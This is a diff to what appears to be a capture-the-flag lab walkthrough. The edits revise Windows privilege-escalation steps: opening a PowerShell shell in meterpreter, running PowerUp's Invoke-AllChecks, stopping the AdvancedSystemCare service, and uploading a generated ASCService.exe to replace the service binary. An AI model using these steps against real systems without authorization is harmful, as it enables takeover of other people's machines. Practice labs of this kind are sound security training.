@@ -64,9 +64,11 @@ Take close attention to the CanRestart option that is set to true. What is the n
 
 3) Load powershell in meterpreter (type "load powershell" into meterpreter)
 
-4) Type . .\Powerup.ps1
+4) Type powershell_shell
 
-5) Type Invoke-AllChecks
+5) Type . .\Powerup.ps1
+
+6) Type Invoke-AllChecks
 
 ![Untitled](https://github.com/user-attachments/assets/d880fac8-5106-4520-8b72-e02d993c38dd)
 
@@ -86,9 +88,8 @@ sc stop AdvancedSystemCareService9
 
 After that exit the shell.
 
-3) Go to C:\Program Files (x86)\IObit\Advanced SystemCare and upload ASCService.exe file which we generated
+3) Go to C:\Program Files (x86)\IObit\ and upload ASCService.exe file which we generated than copy it to C:\Program Files (x86)\IObit\Advanced SystemCare
 
-![Untitled](https://github.com/user-attachments/assets/ba600259-e337-42b9-a582-8e0f04088ed6)
 
 
 
